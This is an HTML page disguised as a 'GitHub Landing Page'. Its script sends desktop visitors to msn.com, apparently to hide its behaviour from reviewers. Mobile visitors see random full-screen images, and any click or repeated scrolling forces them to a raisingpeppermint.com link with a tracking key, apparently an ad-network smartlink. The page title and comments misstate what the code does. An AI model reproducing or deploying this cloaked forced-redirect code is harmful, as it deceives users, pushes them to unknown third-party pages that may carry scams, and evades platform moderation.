<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Landing Page</title>
    <style>
        /* Global Reset */
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden; /* Prevent body scrollbar */
            font-family: Arial, sans-serif;
        }

        /* Container for the full-screen image sections */
        .image-container {
            height: 100vh;
            width: 100vw;
            overflow-y: scroll; /* Enable vertical scrolling within this container */
            scroll-snap-type: y mandatory; /* Enforce full-section snapping */
            -webkit-overflow-scrolling: touch; /* Better mobile scrolling */
            cursor: pointer; /* Keep the click cursor */
        }

        /* Style for each full-screen image section */
        .full-image-section {
            height: 100vh;
            width: 100vw;
            scroll-snap-align: start; /* Snap to the top of the section */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            /* Important: Ensures the click handler on the body/container works */
            position: relative;
        }
    </style>
    <script>
        const desktopURL = "https://www.msn.com/it-it";
        const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());

        if (!isMobile) {
            // Desktop users redirected immediately to GitHub
            window.location.replace(desktopURL);
        }
    </script>
</head>
<body class="clickup-chrome-ext_installed">
    <div class="image-container" id="imageContainer"></div>

    <script>
        // Array of 16 image URLs
        const imageUrls = [
            'https://i.imgur.com/hmAABJ7.jpg',
            'https://i.imgur.com/ZYGvd6q.jpg',
            'https://i.imgur.com/YpxSLD0.jpg',
            'https://i.imgur.com/JSU3t4x.jpg',
            'https://i.imgur.com/rMwqoZP.jpg',
            'https://i.imgur.com/Dpi9Zzv.jpg',
            'https://i.imgur.com/0kpyxuU.jpg',
            'https://i.imgur.com/wzYPBDJ.jpg',
            'https://i.imgur.com/wGi8uyT.jpg',
            'https://i.imgur.com/tTxAmNF.jpg',
            'https://i.imgur.com/pSX3j18.jpg',
            'https://i.imgur.com/jwFUISy.jpg',
            'https://i.imgur.com/adL2Ou5.jpg',
            'https://i.imgur.com/lcFOzxz.jpg',
            'https://i.imgur.com/TrIPXQf.jpg',
            'https://i.imgur.com/LkW7EgA.jpg'
        ];
        
        // Array of destination URLs
        const destinationUrls = [
            "https://raisingpeppermint.com/a8bm1f5h?key=f439d5578a6d85c71bd795362421ce02",
            "https://raisingpeppermint.com/a8bm1f5h?key=f439d5578a6d85c71bd795362421ce02", 
            "https://raisingpeppermint.com/a8bm1f5h?key=f439d5578a6d85c71bd795362421ce02"
        ];
        
        // Get a random set of 4 images for this session
        function getRandomImages() {
            const shuffled = [...imageUrls].sort(() => 0.5 - Math.random());
            return shuffled.slice(0, 4);
        }
        
        // Get a random set of 4 destination URLs for this session
        function getRandomDestinations() {
            const shuffled = [...destinationUrls].sort(() => 0.5 - Math.random());
            return shuffled.slice(0, 4);
        }
        
        // Create image sections with random destinations
        function createImageSections() {
            const selectedImages = getRandomImages();
            const selectedDestinations = getRandomDestinations();
            
            // Clear any existing sections
            imageContainer.innerHTML = '';
            
            // Create 4 sections with the selected images and destinations
            for (let i = 0; i < 4; i++) {
                const section = document.createElement('div');
                section.className = 'full-image-section';
                section.style.backgroundImage = `url('${selectedImages[i]}')`;
                section.id = `img${i+1}`;
                section.dataset.destination = selectedDestinations[i];
                imageContainer.appendChild(section);
            }
        }
        
        // Initialize the page
        createImageSections();
        
        // Scroll tracking
        let scrollCount = 0;
        let lastScrollTop = 0;
        const requiredScrolls = 5;
        let isRedirecting = false;
        
        imageContainer.addEventListener('scroll', () => {
            if (isRedirecting) return;
            
            const scrollTop = imageContainer.scrollTop;
            const scrollHeight = imageContainer.scrollHeight;
            const clientHeight = imageContainer.clientHeight;
            
            // Detect scroll direction and count full scrolls
            if (scrollTop > lastScrollTop && 
                scrollTop + clientHeight >= scrollHeight - 10) {
                // Scrolled to bottom
                scrollCount++;
                
                // If reached required scrolls, redirect immediately
                if (scrollCount >= requiredScrolls) {
                    isRedirecting = true;
                    // Redirect to a random destination when scrolled enough
                    const randomIndex = Math.floor(Math.random() * destinationUrls.length);
                    window.location.href = destinationUrls[randomIndex];
                }
            }
            
            lastScrollTop = scrollTop;
        });
        
        // Click redirect (only if not already redirecting from scrolling)
        imageContainer.addEventListener("click", (e) => {
            if (!isRedirecting) {
                // Find which image was clicked
                const clickedElement = e.target.closest('.full-image-section');
                if (clickedElement && clickedElement.dataset.destination) {
                    window.location.href = clickedElement.dataset.destination;
                } else {
                    // Fallback to a random destination if no specific one found
                    const randomIndex = Math.floor(Math.random() * destinationUrls.length);
                    window.location.href = destinationUrls[randomIndex];
                }
            }
        });
    </script>
</body>
</html>
